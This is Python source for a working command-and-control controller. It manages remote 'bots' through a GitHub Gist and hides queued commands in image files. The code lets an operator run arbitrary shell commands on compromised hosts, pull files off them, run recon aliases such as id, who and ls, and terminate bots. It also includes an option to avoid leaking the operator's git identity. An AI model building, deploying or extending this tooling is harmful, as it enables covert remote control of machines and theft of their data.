import argparse
import os
import select
import sys
from typing import Optional, Any, Dict, Union

from terminal import gray, rst, cyan, magenta, yellow, green, red
from common import \
    CONTROL_IMAGE, \
    UPDATE_INTERVAL, \
    KEEP_ALIVE_TIMEOUT, \
    now_ms, \
    is_image, \
    decode_data, \
    encode_data, \
    format_timestamp, \
    ParticipantBase


class Controller(ParticipantBase):

    def _setup(self) -> None:
        super()._setup()

        self._current_timestamp: int = now_ms()
        self._bots = {}
        self._pending_commands = {}

        pass

    def run(self) -> None:
        self._setup()

        while True:
            self._update_state()
            print(
                f'\nAuto update in {cyan}{UPDATE_INTERVAL}{rst} seconds. Press {yellow}enter{rst} to force update.\n'
                f'Press {red}Ctrl-C{rst} to stop.\n'
                f'Enter a command. Use {cyan}?{rst} or {cyan}help{rst} to show help.\n'
                '> ',
                end='',
            )
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                # do not remove trailing whitespace except newline chars
                cmd_str = sys.stdin.readline().lstrip().rstrip('\r\n')
                self._process_command(cmd_str)
            else:
                # so we do not write to the prompt line
                # note: we could also use ASCII ESC sequences to clear the prompt (and add colors as well)
                print('')

        pass

    @staticmethod
    def stop() -> None:
        print('\nStopping the controller. Note that the bots might still be running.')
        print('Use terminate command to stop a specific bot.')

    def _handle_command_result(self, bot_name: str, result: Dict[str, Any]) -> None:

        pending_cmd = self._bots[bot_name]['cmd']

        if pending_cmd is None:
            return

        result_id = result['id'] if 'id' in result and isinstance(result['id'], str) else None

        if result_id is None:
            return

        if pending_cmd['id'] != result_id:
            return

        timestamp = result['timestamp'] if 'timestamp' in result and isinstance(result['timestamp'], int) else None
        exit_code = result['exit_code'] if 'exit_code' in result and isinstance(result['exit_code'], int) else None
        stdout = result['stdout'] if 'stdout' in result and isinstance(result['stdout'], str) else None
        stderr = result['stderr'] if 'stderr' in result and isinstance(result['stderr'], str) else None
        files = result['files'] if 'files' in result and isinstance(result['files'], list) else None

        elapsed_seconds = (self._current_timestamp - pending_cmd['timestamp']) / 1000

        print(f"command {cyan}{result_id}{rst} finished:")
        print(f'  command: {cyan}{self._cmd_to_string(pending_cmd)}{rst}')
        print(f'  elapsed time since the command was sent: {cyan}{elapsed_seconds:.2f} seconds{rst}')
        if timestamp is None:
            print(f'  {red}missing result timestamp{rst}')
        else:
            print(f'  result timestamp = {cyan}{format_timestamp(timestamp)}{rst}')
        if exit_code is None:
            print(f'  {red}missing result exit_code{rst}')
        else:
            print(f'  result exit_code = {green if exit_code == 0 else red}{exit_code}{rst}')
        if stdout is None:
            print(f'  {red}missing result stdout{rst}')
        else:
            print(f'  result stdout:{rst}')
            print(stdout)
        if stderr is None:
            print(f'  {red}missing result stderr{rst}')
        else:
            print(f'  result stderr:{rst}')
            print(stderr)
        if files is not None:
            print(f'  result files:{rst}')
            for f in files:
                if isinstance(f, str) and f != '':
                    print(f'    {green}{os.path.join(self._workdir, bot_name, f)}{rst}')
                else:
                    print(f'    {red}invalid file name{rst}')
        elif pending_cmd['name'] == 'copy_from' and files is None:
            print(f'  {red}missing result files{rst}')

        # clear pending command
        # once the bot registers this update, it will in turn set the result in its image to null
        self._bots[bot_name]['cmd'] = None
        self._pending_commands[bot_name] = None

        pass

    def _update_bot(self, name: str, data: Any) -> bool:
        print(f'{gray}trying to update bot {name}')

        if not isinstance(data, dict):
            print(f'{gray}bot {name}: invalid data{rst}')
            return False
        if 'last_update' not in data or not isinstance(data['last_update'], int):
            print(f'{gray}bot {name}: missing last_update{rst}')
            return False

        last_update = data['last_update']

        if (self._current_timestamp - last_update) > KEEP_ALIVE_TIMEOUT:
            if name is self._bots:
                print(f'{red}[DEAD BOT] {yellow}{name}{rst}: KEEP_ALIVE_TIMEOUT exceeded, removing')
                del self._bots[name]
                del self._pending_commands[name]
                return False

        if name not in self._bots:
            print(f'{green}[NEW BOT] {yellow}{name}{rst}')
            bot = {
                'last_update': last_update,
                'cmd': None,
            }
            self._bots[name] = bot
            self._pending_commands[name] = None
        else:
            self._bots[name]['last_update'] = last_update

        result = data['result'] if 'result' in data and isinstance(data['result'], dict) else None

        if result is not None:
            self._handle_command_result(name, result)

        return True

    def _update_state(self) -> None:
        print(f'{gray}updating state ...{rst}')
        self._current_timestamp = now_ms()

        self._comm_client.pull_changes()

        data_files = set(filter(lambda f: f != CONTROL_IMAGE and is_image(f), os.listdir('comm')))

        for bot_name in data_files:
            # TODO: consider handling exceptions and removing invalid files instead of just crashing
            bot_data = decode_data('comm/' + bot_name, out_dir=bot_name)
            if not self._update_bot(bot_name, bot_data):
                print(f'{gray}update_bot returned False for {bot_name}, removing the file from the gist ...{rst}')
                os.remove('comm/' + bot_name)
                self._comm_client.add([bot_name])

        # handles case when the bot file (image) is gone,
        # but we still have a record in the memory
        # (this can happen, for example, when the bot is cleanly terminated)
        bots_to_delete = []
        for bot_name, bot in self._bots.items():
            if (self._current_timestamp - bot['last_update']) > KEEP_ALIVE_TIMEOUT:
                print(f'{red}[DEAD BOT] {yellow}{bot_name}{rst}: KEEP_ALIVE_TIMEOUT exceeded, removing')
                bots_to_delete.append(bot_name)
                # cannot delete here during the dict iteration
            elif not os.path.exists('comm/' + bot_name):
                if bot['cmd'] is not None and bot['cmd']['name'] == 'terminate':
                    print(
                        f'{red}[TERMINATED BOT] {yellow}{bot_name}{rst}:'
                        ' bot image gone probably as the result of the pending terminate command'
                    )
                else:
                    print(f'{red}[DEAD BOT] {yellow}{bot_name}{rst}: bot image does not exist, removing')
                bots_to_delete.append(bot_name)
        for bot_name in bots_to_delete:
            del self._bots[bot_name]
            del self._pending_commands[bot_name]
            if os.path.exists('comm/' + bot_name):
                os.remove('comm/' + bot_name)
                self._comm_client.add([bot_name])

        # update the control image
        encode_data(
            image_file='lib/' + CONTROL_IMAGE,
            data=self._pending_commands,
            output_file='comm/' + CONTROL_IMAGE,
        )
        self._comm_client.add([CONTROL_IMAGE])

        # commit and push all changes if needed
        # note: there can only be two types of changes:
        #   1. added/updated the control image
        #   2. deleted some bot images (not cleanly terminated dead bots)
        self._comm_client.commit_and_push_if_needed()

        print(f"{gray}successful update on {green}{format_timestamp(self._current_timestamp)}{rst}")

        pass

    def _print_bots(self) -> None:
        print(f'\nBOTS ({cyan}{len(self._bots)}{rst}):')
        for bot_name, bot_data in self._bots.items():
            pretty_name = bot_name  # strip .png or .jpg extension
            record_age: float = (self._current_timestamp - bot_data['last_update']) / 1000
            print(
                f'  bot {yellow}{pretty_name}{rst}\n'
                f'    last update {red if record_age > 70 else green}{record_age:.2f}{rst} seconds ago'
            )
            pending_cmd = bot_data['cmd']
            if pending_cmd is not None:
                print(
                    f"    pending command {cyan}{pending_cmd['id']}{rst}"
                    f" from {magenta}{format_timestamp(pending_cmd['timestamp'])}{rst}\n"
                    f"      {cyan}{self._cmd_to_string(pending_cmd)}{rst}"
                )
            else:
                print('    no pending command')
        print('')
        pass

    def _is_valid_bot(self, bot: str) -> bool:
        return bot in self._bots

    # COMMANDS

    # noinspection PyMethodMayBeStatic
    def _generate_new_command_id(self) -> str:
        return os.urandom(16).hex()

    def _create_command(self, name: str) -> Dict[str, Union[str, bool, int]]:
        return {
            'id': self._generate_new_command_id(),
            'timestamp': now_ms(),
            'name': name,
        }

    @staticmethod
    def _cmd_to_string(cmd: Dict[str, Union[str, bool, int]]) -> str:
        if cmd['name'] == 'terminate':
            return 'terminate'
        if cmd['name'] == 'copy_from':
            return f"copy {cmd['file_name']}"
        if cmd['name'] == 'run' and cmd['shell'] is False:
            return f"run {cmd['cmd']}"
        if cmd['name'] == 'run' and cmd['shell'] is True:
            return f"shell {cmd['cmd']}"
        return 'unknown command'

    def _set_command(self, bot: str, cmd: Dict[str, Union[str, bool, int]]) -> None:
        if self._bots[bot]['cmd'] is not None:
            print(f'{yellow}warning: there is a pending command for bot {bot}, overwriting with a new command{rst}')
        self._bots[bot]['cmd'] = cmd
        self._pending_commands[bot] = cmd
        print(
            f"new pending command {cyan}{cmd['id']}{rst} set for bot {yellow}{bot}{rst}:"
            f" {cyan}{self._cmd_to_string(cmd)}{rst}"
        )
        return

    @staticmethod
    def _print_help() -> None:
        print(
            f'\n{red}AVAILABLE COMMANDS:\n\n'
            f'{cyan}help{rst}\n'
            f'  {gray}Prints this help.{rst}\n'
            f'{cyan}bots\n'
            f'  {gray}Lists all bots and their status.{rst}\n'
            f'{cyan}terminate {yellow}<bot>{rst}\n'
            f'  {gray}Terminates the bot.{rst}\n'
            f'{cyan}shell {yellow}<bot> {magenta}<command>{rst}\n'
            f'  {gray}Runs the given command on the bot using the following Python code.\n'
            f'    subprocess.run(args=[{magenta}<command>{rst}{gray}], shell={magenta}True{rst}{gray})\n'
            f'  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            f'  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.{rst}\n'
            f'{cyan}run {yellow}<bot> {magenta}<command>{rst}\n'
            f'  {gray}Runs the given command on the bot using the following Python code.\n'
            f'    subprocess.run(args={magenta}shlex.split(<command>){rst}{gray}, shell={magenta}False{rst}{gray})\n'
            f'  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            f'  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.{rst}\n'
            f'{cyan}copyFrom {yellow}<bot> {magenta}<file name>{rst}\n{gray}'
            f'  {gray}Copies the file from the bot to the controller\'s workdir.{rst}\n'
            f'{cyan}do {yellow}<bot>{rst} id{rst}\n'
            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}id\n'
            f'{cyan}do {yellow}<bot>{rst} who{rst}\n'
            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}who{rst}\n'
            f'{cyan}do {yellow}<bot>{rst} ls {magenta}<path>{rst}\n'
            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}ls -lha <path>{rst}\n'
        )

    def _process_terminate_command(self, bot) -> None:
        c = self._create_command('terminate')
        self._set_command(bot, c)
        pass

    def _process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
        if cmd is None:
            print(f'{red}Missing <command> argument!{rst}')
            return
        if cmd == '':
            print(f'{red}Invalid empty <command> argument!{rst}')
            return
        c = self._create_command('run')
        # add args
        c['shell'] = shell
        c['cmd'] = cmd
        self._set_command(bot, c)
        pass

    def _process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
        if file_name is None:
            print(f'{red}Missing <file name> argument!{rst}')
            return
        if file_name == '':
            print(f'{red}Invalid empty <file name> argument!{rst}')
            return
        c = self._create_command('copy_from')
        # add args
        c['file_name'] = file_name
        self._set_command(bot, c)
        pass

    def _process_do_command(self, bot, action: Optional[str]) -> None:
        if action is None:
            print(f'Missing do action!')
            return
        if action == 'id':
            self._process_run_command(bot, shell=True, cmd='id')
            return
        if action == 'who':
            self._process_run_command(bot, shell=True, cmd='who')
            return
        if action.startswith('ls'):
            path = action[3:]
            if path == '':
                print(f"{red}Invalid path '{path}'!{rst}")
                return
            self._process_run_command(bot, shell=True, cmd='ls -lha ' + path)
            return
        print(f"{red}Invalid do action '{action}'!{rst}")
        return

    def _process_command(self, cmd_str) -> None:
        if cmd_str == '':
            # no command
            return

        parts = cmd_str.split(sep=' ', maxsplit=1)
        cmd_name = parts[0]

        if cmd_name not in {'help', '?', 'bots', 'terminate', 'shell', 'run', 'copyFrom', 'do'}:
            print(f"{red}Invalid or unknown command '{cmd_str}'!{rst}")
            print(f'Type {cyan}?{rst} or {cyan}help{rst} to show help.')
            return

        if cmd_name == 'help' or cmd_name == '?':
            self._print_help()
            return

        if cmd_name == 'bots':
            self._print_bots()
            return

        # all other commands should have format <cmd_name> <bot> <...the rest>
        if len(parts) != 2:
            print(
                f'{red}Missing {yellow}<bot>{rst} {red}argument!\n'
                f'Type {cyan}bots{rst}{red} to list all available bots.{rst}'
            )
            return

        sub_parts = parts[1].split(sep=' ', maxsplit=1)
        bot = sub_parts[0]
        args_str = sub_parts[1] if len(sub_parts) == 2 else None
        if not self._is_valid_bot(bot):
            print(
                f"{red}Invalid bot '{yellow}{bot}{rst}{red}' given!\n"
                f"Type {cyan}bots{rst}{red} to list all available bots.{rst}"
            )
            return

        if cmd_name == 'terminate':
            self._process_terminate_command(bot)
            return
        if cmd_name == 'shell':
            self._process_run_command(bot, shell=True, cmd=args_str)
            return
        if cmd_name == 'run':
            self._process_run_command(bot, shell=False, cmd=args_str)
            return
        if cmd_name == 'copyFrom':
            self._process_copy_from_command(bot, file_name=args_str)
            return
        if cmd_name == 'do':
            self._process_do_command(bot, action=args_str)
            return

        print(f"{red}Invalid or unknown command '{cmd_str}'!{rst}")
        print(f'Type {cyan}?{rst} or {cyan}help{rst} to show help.')

    pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--author',
        help=(
            'override the default git commit author'
            ' (useful when you don\'t want to leak your global git config author value)'
        ),
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='skip resetting the git repos if they already exist',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='skip updating the git repos if they already exist',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='shortcut for combination of of --skip-init-reset and --skip-init-pull',
    )
    _args = _parser.parse_args()
    _controller = Controller(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        author=_args.author,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _controller.run()
    except KeyboardInterrupt:
        _controller.stop()
